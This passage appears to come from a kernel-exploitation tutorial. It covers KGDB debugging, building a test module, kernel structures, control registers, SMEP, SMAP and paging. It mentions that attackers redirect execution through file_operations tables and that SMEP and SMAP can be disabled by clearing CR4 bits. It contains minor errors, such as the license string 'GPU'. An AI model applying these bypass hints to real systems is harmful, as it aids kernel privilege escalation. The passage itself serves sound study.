GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
(SNIP)
</code></pre>
<p>Turning the Debian back on would result in a similiar message:</p>
<pre><code class="lang-auto">KASLR disabled: 'nokaslr' on cmdline.
[	1.571915] KGDB: Waiting for connection from remote gdb...
</code></pre>
<p>Attaching to DebianHOST’s GDB is then possible:</p>
<pre><code class="lang-auto">(gdb) set serial baud 115200
(gdb) target remote /dev/ttyS1
Remote debugging using /dev/ttyS1
kgdb_breakpoint () at kernel/debug/debug_core.c:1073
1073		wmb(); /* Sync point after breakpoint */
(gdb) list
1068	noinline void kgdb_breakpoint(void)
1069	{
1070		atomic_inc(&amp;kgdb_setting_breakpoint);
1071		wmb(); /* Sync point before breakpoint */
1072		arch_kgdb_breakpoint();
1073		wmb(); /* Sync point after breakpoint */
1074		atomic_dec(&amp;kgdb_setting_breakpoint);
1075	}
1076	EXPORT_SYMBOL_GPL(kgdb_breakpoint);
1077
(gdb)
</code></pre>
<p>Know that by writing <em>‘continue’</em> on <em>GDB</em>, you wouldn’t be able to control it again unless you use the <em>magic SysRq key</em> to force a <em>SIGTRAP</em> to happen:</p>
<pre><code class="lang-bash">root@Nwwz:~# echo "g" &gt; /proc/sysrq-trigger
</code></pre>
<p>And you can see in <em>DebianHOST</em> that it works.</p>
<pre><code class="lang-bash">(SNIP)
[New Thread 459]
[New Thread 462]
[New Thread 463]
[New Thread 476]
[New Thread 485]
[New Thread 487]

Thread 56 received signal SIGTRAP, Trace/breakpoint trap.
[Switching to Thread 489]
kgdb_breakpoint () at kernel/debug/debug_core.c:1073
1073	wmb(); /* Sync point after breakpoint */
(gdb)
</code></pre>
<h5>Compiling a simple module:</h5>
<p>A simple Hello 0x00sec module would be created.<br>
We need to make a directory in root folder, and prepare two files:</p>
<pre><code class="lang-bash">root@Nwwz:~# mkdir mod
root@Nwwz:~# cd mod
root@Nwwz:~/mod/# nano hello.c
</code></pre>
<pre><code class="lang-auto">#include &lt;linux/init.h&gt;
#include &lt;linux/module.h&gt;

static void hello_exit(void){
	printk(KERN_INFO "Goodbye!\n");
}

static int hello_init(void){
	printk(KERN_INFO "Hello 0x00sec!\n");
	return 0;
}
MODULE_LICENSE("GPU");

module_init(hello_init);
module_exit(hello_exit);
</code></pre>
<pre><code class="lang-bash">root@Nwwz:~/mod/# nano Makefile
</code></pre>
<pre><code class="lang-auto">obj-m += hello.o
KDIR   = /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$(PWD) modules
clean:
	rm -rf *.ko *.o *.mod.* *.symvers *.order
</code></pre>
<p>Then, one can start compiling using <em>‘make’</em> and insert/remove the module in kernel to trigger both init and exit handlers.</p>
<pre><code class="lang-auto">root@Nwwz:~/mod# make
make -c /lib/modules/4.17.0/build M=/root/mod modules
make[1]: Entering directory '/usr/src/linux-4.17.2'
	CC [M]	/root/mod/hello.o
	Building modules, stage 2.
	MODPOST 1 modules
	CC	/root/mod/hello.mod.o
	LD [M] /root/mod/hello.ko
make[1]: Leaving directory '/usr/src/linux-4.17.2'
root@Nwwz:~/mod# insmod hello.ko
root@Nwwz:~/mod# rmmod hello.ko
</code></pre>
<p>The messages would be by then saved in the <em>dmesg</em> circular buffer.</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# dmesg | grep Hello
[ 6545.039487] Hello 0x00sec!
root@Nwwz:~/mod# dmesg | grep Good
[ 6574.452282] Goodbye!
</code></pre>
<p>To clean the current directory:</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# make clean
</code></pre>
<h5>What?:</h5>
<p>The kernel doesn’t count on the <em>C library</em> we’ve been used to, because it’s judged useless for it.<br>
So instead, after the module is linked and loaded in kernel-space(<em>requires root privileges, duh</em>).<br>
It can use header files available in the <strong>kernel source tree</strong>, which offers a huge number of functions such as <em>printk()</em> which logs the message and sets it’s priority, <em>module_init()</em> and <em>module_exit()</em> to declare initialization and clean-up functions.<br>
And while application usually run with no chance of changing their variables by another thread. This<br>
certainly isn’t the case for <em>LKM</em>s, since what they offer could be used by multiple processes at a single time, which could lead(<em>if the data dealt with is sensible, aka in critical region</em>) to a <em>panic</em>, or worse(<em>better?</em>), a <strong>compromise</strong>.</p>
<h5>Few structs:</h5>
<p>The kernel implements multiple locks, only semaphores and spinlocks will likely be used here.<br>
When the <em>semaphore</em> is previously held, the thread will <em>sleep</em>, <em>waiting for the lock to be released</em> so he can <em>claim it</em>.<br>
That’s why it’s a <em>sleeping lock</em>, therefore, it’s only used in <em>process context</em>.</p>
<pre><code class="lang-auto">/* Please don't access any members of this structure directly */
struct semaphore {
	raw_spinlock_t		lock;
	unsigned int		count;
	struct list_head	wait_list;
};
</code></pre>
<p>It can then be initialized with sema_init() or DEFINE_SEMAPHORE():</p>
<pre><code class="lang-auto">#define __SEMAPHORE_INITIALIZER(name, n)				\
{									\
	.lock		= __RAW_SPIN_LOCK_UNLOCKED((name).lock),	\
	.count		= n,						\
	.wait_list	= LIST_HEAD_INIT((name).wait_list),		\
}

static inline void sema_init(struct semaphore *sem, int val)
{
	static struct lock_class_key __key;
	*sem = (struct semaphore) __SEMAPHORE_INITIALIZER(*sem, val);
	lockdep_init_map(&amp;sem-&gt;lock.dep_map, "semaphore-&gt;lock", &amp;__key, 0);
}
</code></pre>
<p>With <em>val</em> being the <em>much processes</em> that can <em>hold the lock</em> at once.<br>
It’s normally set to <em>1</em>, and a semaphore with a count of <em>1</em> is called a <em>mutex</em>.<br>
Another type of locks would be <em>spinlocks</em>, it keeps the <em>thread spinning instead of sleeping</em>, for that reason, it can be used in the <em>interrupt context</em>.</p>
<pre><code class="lang-auto">typedef struct spinlock {
	union {
		struct raw_spinlock rlock;

#ifdef CONFIG_DEBUG_LOCK_ALLOC
# define LOCK_PADSIZE (offsetof(struct raw_spinlock, dep_map))
		struct {
			u8 __padding[LOCK_PADSIZE];
			struct lockdep_map dep_map;
		};
#endif
	};
} spinlock_t;


#define __RAW_SPIN_LOCK_INITIALIZER(lockname)	\
	{					\
	.raw_lock = __ARCH_SPIN_LOCK_UNLOCKED,	\
	SPIN_DEBUG_INIT(lockname)		\
	SPIN_DEP_MAP_INIT(lockname) }

#define __RAW_SPIN_LOCK_UNLOCKED(lockname)	\
	(raw_spinlock_t) __RAW_SPIN_LOCK_INITIALIZER(lockname)

# define raw_spin_lock_init(lock)				\
	do { *(lock) = __RAW_SPIN_LOCK_UNLOCKED(lock); } while (0)
#endif

static __always_inline raw_spinlock_t *spinlock_check(spinlock_t *lock)
{
	return &amp;lock-&gt;rlock;
}

#define spin_lock_init(_lock)				\
do {							\
	spinlock_check(_lock);				\
	raw_spin_lock_init(&amp;(_lock)-&gt;rlock);		\
} while (0)
</code></pre>
<p>Enough with locks, what about <em>file_operations</em>?<br>
This struct holds the <em>possible operations</em> that can be called on a <em>device/file/entry</em>.<br>
When creating a <em>character device</em> by directly calling <em>cdev_alloc()</em> or <em>misc_register()</em>, it has to be provided along with the <em>major</em>(<em>on first function only</em>) and <em>minor</em>.<br>
It is defined as follows:</p>
<pre><code class="lang-auto">struct file_operations {
	struct module *owner;
	loff_t (*llseek) (struct file *, loff_t, int);
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	...
} __randomize_layout;
</code></pre>
<p>There are similiar structs too, such as <em>inode_operations</em>, <em>block_device_operations</em> and <em>tty_operations</em>…<br>
But they all provide <em>handlers</em> to <em>userspace function</em> if the file/inode/blockdev/tty is the target.<br>
These are sometimes used by the attacker in order to <em>redirect execution</em> such as <em>perf_fops</em> or <em>ptmx_fops</em>.</p>
<p>The kernel provides some structs for lists with different <em>search times</em>.<br>
The first being <em>double linked-list</em>, <em>list_head</em>, it’s definition is simple, pointing to the <em>next</em> and <em>previous</em> <em>list_head</em>.</p>
<pre><code class="lang-auto">struct list_head {
	struct list_head *next, *prev;
};
</code></pre>
<p>While the second is redblack tree, <em>rb_node</em>, provides better <em>search time</em>.</p>
<pre><code class="lang-auto">struct rb_node {
	unsigned long  __rb_parent_color;
	struct rb_node *rb_right;
	struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));
</code></pre>
<p>It can be used to find the <em>target value</em> faster, if it’s <em>bigger</em> than the <em>first node</em>(<em>head</em>), then go <em>right</em>, else, go <em>left</em>.<br>
Function <em>container_of()</em> can then be used to extract the <em>container struct</em>.<br>
Note: Each device, can have multiple <em>minors</em>, but it’ll necessarily have a single <em>major</em>.</p>
<pre><code class="lang-bash">root@Nwwz:/# cd /dev
root@Nwwz:/dev# ls -l
total 0
crw------- 1 root root    [10], 175 Feb  9 09:24 agpgart
                            |
                            *-&gt; Same major, different minors.
                            |							
crw-r--r-- 1 root root    [10], 235 Feb  9 09:24 autofs
drwxr-xr-x 2 root root         160 Feb  9 09:24 block
drwxr-xr-x 2 root root          80 Feb  9 09:24 bsg
(SNIP)
[c]rw-rw-rw- 1 root tty      [5], [2] Feb  9 12:06 ptmx
|                             |    |
|                             |    *--&gt; Minor
*---&gt; Character Device        *---&gt; Major
(SNIP)
[b]rw-rw---- 1 root cdrom    [11], [0] Feb  9 09:24 sr0
|                             |    |
|                             |    *--&gt; Minor
*---&gt; Block Device            *---&gt; Major
(SNIP)
</code></pre>
<h5>Debug a module:</h5>
<p>When we started <em>gdb</em>, the only image it was aware of, is the <em>vmlinux</em> one.<br>
It doesn’t know about the <em>loaded module</em>, and doesn’t know about the <em>load location</em>.<br>
In order to provide these things and make debugging the module possible, one has to first transfer<br>
the target module to <em>DebianHOST</em>.</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# service ssh start
</code></pre>
<p>Once that’s done, one should find different sections and addresses of the LKM in memory:</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# insmod simple.ko
root@Nwwz:~/mod# cd /sys/module/simple/sections
root@Nwwz:/sys/module/simple/sections# ls -la
total 0
drwxr-xr-x 2 root root	   0 Aug 11 06:30 .
drwxr-xr-x 5 root root	   0 Aug  2 17:55 ..
-r-------- 1 root root	4096 Aug 11 06:31 .bss
-r-------- 1 root root	4096 Aug 11 06:31 .data
-r-------- 1 root root	4096 Aug 11 06:31 .gnu.linkonce.this_module
-r-------- 1 root root	4096 Aug 11 06:31 __mcount_loc
-r-------- 1 root root	4096 Aug 11 06:31 .note.gnu.build-id
-r-------- 1 root root	4096 Aug 11 06:31 .orc_unwind
-r-------- 1 root root	4096 Aug 11 06:31 .orc_unwind_ip
-r-------- 1 root root	4096 Aug 11 06:31 .rodata.str1.1
-r-------- 1 root root	4096 Aug 11 06:31 .rodata.str1.8
-r-------- 1 root root	4096 Aug 11 06:31 .strtab
-r-------- 1 root root	4096 Aug 11 06:31 .symtab
-r-------- 1 root root	4096 Aug 11 06:31 .text
root@Nwwz:/sys/module/simple/sections# cat .text
0xffffffffc054c000
root@Nwwz:/sys/module/simple/sections# cat .data
0xffffffffc054e000
root@Nwwz:/sys/module/simple/sections# cat .bss
0xffffffffc054e4c0
</code></pre>
<p>Back to <em>DebianHOST</em> and in gdb:</p>
<pre><code class="lang-python">(gdb) add-symbol-file simple.ko 0xffffffffc054c000 -s .data 0xffffffffc054e000 -s .bss 0xffffffffc054e4c0
</code></pre>
<p>And that’s it.</p>
<h4>Chapter II: <em>Overview on security and General understanding</em>
</h4>
<p>“<em>Uuuuh, it’s simple?</em>”</p>
<h5>Control Registers:</h5>
<p>CRs are <em>special registers</em>, being <em>invisible</em> to the <em>user</em>, they hold <em>important</em> information on the current <em>CPU</em> and the <em>process</em> running on it.<br>
<strong>x86_32 and x86_64</strong>:<br>
Keep in mind that their <em>sizes</em> are <em>different</em>(<em>64bit for x86_64, 32bit for x86_32</em>).<br>
<em>CR0</em>:</p>
<pre><code class="lang-bash">x32 and x64:
#0:     PE(Protected Mode Enable)
#1:     MP(Monitor co-processor)
#2:     EM(Emulation)
#3:     TS(Task Switched)
#4:     ET(Extension Type)
#5:     NE(Numeric Error)
#6-15:  Reserved
#16:    WP(Write Protect)
#17:    Reserved
#18:    AM(Alignment Mask)
#19-28: Reserved
#29:    NW(Not-Write Through)
#30:    CD(Cache Disable)
#31:    PG(Paging)
x64 only:
#32-61: Reserved
</code></pre>
<p><em>CR2</em>:<br>
Solely containing the <em>PFLA</em>(<em>Page Fault Linear Address</em>) address, which would later be extracted using <em>do_page_fault</em> function and passed to <em>__do_page_fault</em> to handle it.</p>
<pre><code class="lang-auto">dotraplinkage void notrace
do_page_fault(struct pt_regs *regs, unsigned long error_code)
{
	unsigned long address = read_cr2(); /* Get the faulting address */
	enum ctx_state prev_state;

	prev_state = exception_enter();
	if (trace_pagefault_enabled())
		trace_page_fault_entries(address, regs, error_code);

	__do_page_fault(regs, error_code, address);
	exception_exit(prev_state);
}
NOKPROBE_SYMBOL(do_page_fault);
</code></pre>
<p><em>CR3</em>:<br>
This register contains the physical address of the <em>current process</em> PGD(<em>Page Global Directory</em>), which(<em>once converted back to virtual address</em>) would link to the next <em>level</em>(<em>P4D on five-level page tables</em> or <em>PUD on four-level page tables</em>), but in the end, it’s all to find the same struct, that is, <em>struct page</em>.</p>
<pre><code class="lang-auto">static inline unsigned long read_cr3_pa(void)
{
	return __read_cr3() &amp; CR3_ADDR_MASK;
}

static inline unsigned long native_read_cr3_pa(void)
{
	return __native_read_cr3() &amp; CR3_ADDR_MASK;
}

static inline void load_cr3(pgd_t *pgdir)
{
	write_cr3(__sme_pa(pgdir));
}
</code></pre>
<p>This is called as an example when an Oops happens, and the kernel calls <em>dump_pagetable()</em>.<br>
<em>CR4</em>:</p>
<pre><code class="lang-bash">x32 and x64:
#0:     VME(Virtual-8086 Mode Extensions)
#1:     PVI(Protected Mode Virtual Interrupts)
#2:     TSD(Time Stamp Disable)
#3:     DE(Debugging Extensions)
#4:     PSE(Page Size Extensions)
#5:     PAE(Physical Address Extensions)
#6:     MCE(Machine Check Enable)
#7:     PGE(Page Global Enable)
#8:     PCE(Performance-Monitoring Counter Enable)
#9:     OSFXSR(OS Support for FXSAVE and FXRSTOR Instructions)
#10:    OSXMMEXCPT(OS Support for Unmasked SIMD Floating Point Exceptions)
#11:    UMIP(User-Mode Instruction Prevention)
#12:    Reserved
#13:    VMXE(Virtual Machine Extensions Enable)
#14:    SMXE(Safer Mode Extensions Enable)
#15-16: Reserved
#17:    PCIDE(PCID Enable)
#18:    OSXSAVE(XSAVE and Processor Extended States Enable)
#19:    Reserved
#20:    SMEP(Supervisor Mode Execution Prevention)
#21:    SMAP(Supervisor Mode Access Prevention)
#22-31: Reserved
x64 only:
#31-63: Reserved
</code></pre>
<p><em>CR1</em> and <em>CR5</em> to <em>CR7</em>:<br>
Marked as <em>reserved</em>, accessing them would result in raising the <em>Undefined Behavior</em>(<strong><span class="hashtag">#UD</span></strong>) exception.<br>
<strong>x86_64 only</strong>:<br>
<em>CR8</em>:<br>
Only the first 4 bits are used in this one, while the other 60 bits are <em>reserved(0)</em>.<br>
Also called <em>TPR</em>(<em>Task Priority Register</em>). Those 4 bits are used when servicing interrupts, checking if the task should really be interrupted. It may or may not, depending on the interrupt’s priority: (<em>IP &lt;= TP</em> ? <em>PASS</em>:<strong>SERVICE</strong>).</p>
<p>They differ from architecture to another, while the previous example reviewed two CISC(<em>x86_32</em>, <em>x86_64</em>). <em>Windows</em> itself does have much similiarities at this level:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/3/37a721645c4241ca5904b248c8286667964e4790.png" alt="image" data-base62-sha1="7WkkQivFFlX8xG0EJLmv4WqrKjS" width="690" height="402"><br>
The thing is a little bit more different in RISC(<em>ARM</em> for this example):<br>
Instead of <em>Control Registers</em>, they are named <em>Coprocessors</em>(<em>P0</em> to <em>P15</em>), each <em>Coprocessor</em> holds <em>16</em> registers(<em>C0</em> to <em>C15</em>). Note however, that only <em>CP14</em> and <em>CP15</em> are very important to the <em>system</em>.<br>
<em>MCR</em> and <em>MRC</em> Instructions are available to deal with data transfer(<em>read/write</em>).<br>
An example for the <em>TTBR</em>(<em>Translation Table Base Register</em>) is as follows:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/8/89757594c8563a79137d4348a67bb1e3314a8615.png" alt="image" data-base62-sha1="jC14gDx9ZZjKpaK1oDzZksdxIrj" width="690" height="29"></p>
<h5>SMAP:</h5>
<p>Stands for <em>Supervisor Mode Access Prevention</em>, as it’s name suggests, prevents access to user-space from a more <em>privileged context</em>, that is, <em>ring zero</em>. However, since access may still be necessary in certain occasions, a flag is dedicated(<em>AC in EFLAGS</em>) to this purpose, along with two instructions to <em>set</em> or <em>clear</em> it:<br>
<em>CLAC</em>:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/d/df2e144659b9f0c2b3382f8c7759087babd5d221.png" alt="image" data-base62-sha1="vQlcpknsX4fWsGJk9ji6eNFA21b" width="690" height="83"><br>
<em>STAC</em>:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7ece672cd78f62bfc62465ad510be6e73c16696a.png" alt="image" data-base62-sha1="i5MnpYkZnj3JOkcaRNCAL5HCOFk" width="690" height="86"></p>
<pre><code class="lang-auto">static __init int setup_disable_smap(char *arg)
{
	setup_clear_cpu_cap(X86_FEATURE_SMAP);
	return 1;
}
__setup("nosmap", setup_disable_smap);
</code></pre>
<p>It can be disabled with <em>nosmap</em> boot flag, which would clear the CPU’s <em>SMAP</em> capability, or by unsetting the <em>SMAP bit</em>(<em><span class="hashtag">#21</span></em>) on <em>CR4</em>.</p>
<h5>SMEP:</h5>
<p>An abbreviation for <em>Supervisor Mode Execution Prevention</em>, when running on <em>ring zero</em>, execution would not be allowed to be transmitted to <em>user-space</em>. So both <em>SMEP</em> and <em>SMAP</em> put a form of limitation on the <em>attacker’s</em> surface.</p>
<pre><code class="lang-auto">static __init int setup_disable_smep(char *arg)
{
	setup_clear_cpu_cap(X86_FEATURE_SMEP);
	
	check_mpx_erratum(&amp;boot_cpu_data);
	return 1;
}
__setup("nosmep", setup_disable_smep);
</code></pre>
<p>Knowing if it’s on is as simple as checking <em>/proc/cpuinfo</em>, and it’s the same for <em>SMAP</em>.<br>
This protection can be disabled with <em>nosmep</em> boot flag, it can also be disabled during runtime by unsetting <em>SMEP bit</em>(<em><span class="hashtag">#20</span></em>) on <em>CR4</em>.</p>
<h5>Write-Protect:</h5>
<p>Since code executing at the highest level of privilege should normally be capable of writting to all pages even those marked as <em>RO</em>(<em>Read Only</em>). However, a bit in <em>CR0</em>(<em>WP bit(16th)</em>) is supposed to stop that from happening, by providing additional checks.</p>
<h5>Paging(a bit of segmentation too):</h5>
<p>Linux does separate privileges. the processor can handle up to 4 different rings, starting from <strong>0</strong> which obviously is the <em>most privileged</em> and ending with <strong>3</strong> being the <em>least privileged</em> with limited access to <em>system resources</em>. However, most operating systems do work with only two rings, zero(also called <em>kernel-space</em>) and three(or <em>user-space</em>).<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/d/ddf4ff854f521b78e5c9f9b17c6dcd9defaa88a5.png" alt="image" data-base62-sha1="vFwqtwYnSRFoW3nUoUrVt2NT1UV" width="353" height="215"><br>
Each running process does have a <strong>struct mm_struct</strong> which fully describes it’s virtual memory space.<br>
But when it comes to <em>segmentation</em> and <em>paging</em>, we’re only interested in few objects in this struct: <em>context</em>, the single-linked list <em>mmap</em> and <em>pgd</em>.</p>
<pre><code class="lang-auto">typedef struct {

	u64 ctx_id;

	atomic64_t tlb_gen;

#ifdef CONFIG_MODIFY_LDT_SYSCALL
	struct rw_semaphore	ldt_usr_sem;
	struct ldt_struct	*ldt;
#endif

#ifdef CONFIG_X86_64
	unsigned short ia32_compat;
#endif

	struct mutex lock;
	void __user *vdso;
	const struct vdso_image *vdso_image;

	atomic_t perf_rdpmc_allowed;
#ifdef CONFIG_X86_INTEL_MEMORY_PROTECTION_KEYS

	u16 pkey_allocation_map;
	s16 execute_only_pkey;
#endif
#ifdef CONFIG_X86_INTEL_MPX
	void __user *bd_addr;
#endif
} mm_context_t;
</code></pre>
<p>This struct holds many information on the context, including the <em>Local descriptor table(LDT)</em>, the VDSO image and base address(<em>residing in user-space <strong>__user</strong></em>), a <em>read/write semaphore</em> and a <em>mutual exclusion lock</em>(<em>it’s a semaphore too, remember?</em>).</p>
<pre><code class="lang-auto">struct ldt_struct {

	struct desc_struct	*entries;
	unsigned int		nr_entries;

	int			slot;
};
</code></pre>
<p>The first element in the LDT is a <em>desc_struct</em> pointer, referencing an array of entries, <em>nr_entries</em> of them.<br>
However, know that <em>LDT</em> isn’t usually set up, it would only use the <em>Global Descriptor Table</em>, it’s enough for <em>most</em> processes.</p>
<pre><code class="lang-auto">DEFINE_PER_CPU_PAGE_ALIGNED(struct gdt_page, gdt_page) = { .gdt = {
#ifdef CONFIG_X86_64
	[GDT_ENTRY_KERNEL32_CS]		= GDT_ENTRY_INIT(0xc09b, 0, 0xfffff),
	[GDT_ENTRY_KERNEL_CS]		= GDT_ENTRY_INIT(0xa09b, 0, 0xfffff),
	[GDT_ENTRY_KERNEL_DS]		= GDT_ENTRY_INIT(0xc093, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER32_CS]	= GDT_ENTRY_INIT(0xc0fb, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER_DS]	= GDT_ENTRY_INIT(0xc0f3, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER_CS]	= GDT_ENTRY_INIT(0xa0fb, 0, 0xfffff),
#else
	[GDT_ENTRY_KERNEL_CS]		= GDT_ENTRY_INIT(0xc09a, 0, 0xfffff),
	[GDT_ENTRY_KERNEL_DS]		= GDT_ENTRY_INIT(0xc092, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER_CS]	= GDT_ENTRY_INIT(0xc0fa, 0, 0xfffff),
	[GDT_ENTRY_DEFAULT_USER_DS]	= GDT_ENTRY_INIT(0xc0f2, 0, 0xfffff),
	[GDT_ENTRY_PNPBIOS_CS32]	= GDT_ENTRY_INIT(0x409a, 0, 0xffff),
	[GDT_ENTRY_PNPBIOS_CS16]	= GDT_ENTRY_INIT(0x009a, 0, 0xffff),
	[GDT_ENTRY_PNPBIOS_DS]		= GDT_ENTRY_INIT(0x0092, 0, 0xffff),
	[GDT_ENTRY_PNPBIOS_TS1]		= GDT_ENTRY_INIT(0x0092, 0, 0),
	[GDT_ENTRY_PNPBIOS_TS2]		= GDT_ENTRY_INIT(0x0092, 0, 0),
	[GDT_ENTRY_APMBIOS_BASE]	= GDT_ENTRY_INIT(0x409a, 0, 0xffff),
	[GDT_ENTRY_APMBIOS_BASE+1]	= GDT_ENTRY_INIT(0x009a, 0, 0xffff),
	[GDT_ENTRY_APMBIOS_BASE+2]	= GDT_ENTRY_INIT(0x4092, 0, 0xffff),

	[GDT_ENTRY_ESPFIX_SS]		= GDT_ENTRY_INIT(0xc092, 0, 0xfffff),
	[GDT_ENTRY_PERCPU]		= GDT_ENTRY_INIT(0xc092, 0, 0xfffff),
	GDT_STACK_CANARY_INIT
#endif
} };
EXPORT_PER_CPU_SYMBOL_GPL(gdt_page);
</code></pre>
<p>A per-cpu variable <em>gdt_page</em> is initialized using the <em>GDT_ENTRY_INIT</em> macro.</p>
<pre><code class="lang-auto">#define GDT_ENTRY_INIT(flags, base, limit)			\
	{							\
		.limit0		= (u16) (limit),		\
		.limit1		= ((limit) &gt;&gt; 16) &amp; 0x0F,	\
		.base0		= (u16) (base),			\
		.base1		= ((base) &gt;&gt; 16) &amp; 0xFF,	\
		.base2		= ((base) &gt;&gt; 24) &amp; 0xFF,	\
		.type		= (flags &amp; 0x0f),		\
		.s		= (flags &gt;&gt; 4) &amp; 0x01,		\
		.dpl		= (flags &gt;&gt; 5) &amp; 0x03,		\
		.p		= (flags &gt;&gt; 7) &amp; 0x01,		\
		.avl		= (flags &gt;&gt; 12) &amp; 0x01,		\
		.l		= (flags &gt;&gt; 13) &amp; 0x01,		\
		.d		= (flags &gt;&gt; 14) &amp; 0x01,		\
		.g		= (flags &gt;&gt; 15) &amp; 0x01,		\
	}
</code></pre>
<p>This macro simply takes <em>three arguments</em>, and <em>splits them</em> in order to <em>store</em> at each <em>field</em> a <em>valid value</em>.<br>
The <em>GDT</em> holds more entries on <em>32bit</em> than on <em>64bit</em>.</p>
<pre><code class="lang-auto">struct gdt_page {
	struct desc_struct gdt[GDT_ENTRIES];
} __attribute__((aligned(PAGE_SIZE)));
</code></pre>
<p>Says that <em>gdt_page</em> is an array of <em>GDT_ENTRIES</em>(<em>32</em> on <em>x86_32</em>, <em>16</em> on <em>x86_64</em>) much of <em>desc_struct</em> aligned to <em>PAGE_SIZE</em>(<em>usually 4KB(4096)</em>).</p>
<pre><code class="lang-auto">struct desc_struct {
	u16	limit0;
	u16	base0;
	u16	base1: 8, type: 4, s: 1, dpl: 2, p: 1;
	u16	limit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;
} __attribute__((packed));
</code></pre>
<p>When an ELF is about to run, and is being loaded with <em>load_elf_binary()</em>, it does call <em>setup_new_exec()</em>, <em>install_exec_creds()</em> on <em>bprm</em> before it calls <em>setup_arg_pages()</em> which would pick a <em>random stack pointer</em>.<br>
Before returning <em>successfully</em>, it would call <em>finalize_exec()</em> and <em>start_thread()</em> which would <em>update the stack’s rlimit</em> and <em>begin execution</em> respectively:</p>
<pre><code class="lang-auto">void
start_thread(struct pt_regs *regs, unsigned long new_ip, unsigned long new_sp)
{
	start_thread_common(regs, new_ip, new_sp,
			    __USER_CS, __USER_DS, 0);
}
EXPORT_SYMBOL_GPL(start_thread);
</code></pre>
<p>As you are able to see, this function is just a wrapper around <em>start_thread_common()</em>:</p>
<pre><code class="lang-auto">static void
start_thread_common(struct pt_regs *regs, unsigned long new_ip,
		    unsigned long new_sp,
		    unsigned int _cs, unsigned int _ss, unsigned int _ds)
{
	WARN_ON_ONCE(regs != current_pt_regs());

	if (static_cpu_has(X86_BUG_NULL_SEG)) {

		loadsegment(fs, __USER_DS);
		load_gs_index(__USER_DS);
	}

	loadsegment(fs, 0);
	loadsegment(es, _ds);
	loadsegment(ds, _ds);
	load_gs_index(0);

	regs-&gt;ip		= new_ip;
	regs-&gt;sp		= new_sp;
	regs-&gt;cs		= _cs;
	regs-&gt;ss		= _ss;
	regs-&gt;flags		= X86_EFLAGS_IF;
	force_iret();
}
</code></pre>
<p>As a conclusion, every process starts with default segment registers, but different GPRs, stack and instruction pointer, and by looking at <strong>__USER_DS</strong> and <strong>__USER_CS</strong>:</p>
<pre><code class="lang-auto">#define GDT_ENTRY_DEFAULT_USER_DS	5
#define GDT_ENTRY_DEFAULT_USER_CS	6

#define __USER_DS			(GDT_ENTRY_DEFAULT_USER_DS*8 + 3)
#define __USER_CS			(GDT_ENTRY_DEFAULT_USER_CS*8 + 3)
</code></pre>
<p>We would find the segment registers and their values on <em>user-space</em>:</p>
<pre><code class="lang-auto">Initial state:
CS = 6*8+3 = 0x33
SS = 5*8+3 = 0x2b
DS = FS = ES = 0
</code></pre>
<p>These values can be checked using <em>GDB</em> and a <em>dummy binary</em>.</p>
<pre><code class="lang-bash">(gdb) b* main
Breakpoint 1 at 0x6b0
(gdb) r
Starting program: /root/mod/cs

Breakpoint 1, 0x00005555555546b0 in main ()
(gdb) info reg cs ss
cs		0x33	51
ss		0x2b	43
</code></pre>
<p>Also, you should know that, CS holds in it’s least 2 significant bits, the <em>Current Privilege Level(CPL)</em>, other segment selectors hold the <em>Requested Privilege Level(RPL)</em> instead of <em>CPL</em>.</p>
<pre><code class="lang-bash">(gdb) p/t $cs
$1 = 110011
(gdb) p/x $cs &amp; 0b11
$2 = 0x3
# (Privilege Level: User(3) SuperUser(0))
(gdb) p/d $cs &amp; ~0b1111
$3 = 48
# (Table Offset: 48)
(gdb) p/d $cs &amp; 0b100
$4 = 0
# (Table Indicator: GDT(0) LDT(1))
</code></pre>
<p><strong>3</strong> stands for the <em>third ring</em>, <em>least privileged</em>, that is, <em>user-space</em>.<br>
It doesn’t change, unless the execution is in <em>kernel-space</em>, so it’s similiar for both <em>root</em> and <em>any normal user</em>. So both <em>RPL</em> and <em>CPL</em> could be considered a form of limitation when accessing segments with lower(<em>more privileged</em>) DPL(<em>Descriptor Privilege Level</em>).</p>
<p>When it comes to <em>paging</em>, it’s <em>equivalent bit</em> in <em>CR0</em>(<em><span class="hashtag">#31</span></em>) is only set when the system is running in <em>protected mode</em>(<em>PE bit</em> in <em>CR0</em> is set), because in <em>real mode</em>, <strong>virtual address are equal to physical ones</strong>.<br>
Linux moved from four-level page tables to support five-level page tables by adding an additional layer(<em>P4D</em>), so the levels now are: <em>PGD</em> <em>P4D</em> <em>PUD</em> <em>PMD</em> <em>PTE</em>.<br>
<em>PGD</em> is the first level <em>Page Global Directory</em>, it is a pointer of type <em>pgd_t</em>, and it’s definition is:</p>
<pre><code class="lang-auto">typedef struct { pgdval_t pgd; } pgd_t;
</code></pre>
<p>It holds a <em>pgdval_t</em> inside, which is an unsigned long(<em>8 bytes on x86_64, 4 on x86_32</em>):</p>
<pre><code class="lang-auto">typedef unsigned long	pgdval_t;
</code></pre>
<p>To get to the next level, <em>pagetable_l5_enabled()</em> is called to check if the CPU has <em>X86_FEATURE_LA57</em> enabled.</p>
<pre><code class="lang-auto">#define pgtable_l5_enabled() cpu_feature_enabled(X86_FEATURE_LA57)
</code></pre>
<p>This can be seen in <em>p4d_offset()</em>:</p>
<pre><code class="lang-auto">static inline p4d_t *p4d_offset(pgd_t *pgd, unsigned long address)
{
	if (!pgtable_l5_enabled())
		return (p4d_t *)pgd;
	return (p4d_t *)pgd_page_vaddr(*pgd) + p4d_index(address);
}
</code></pre>
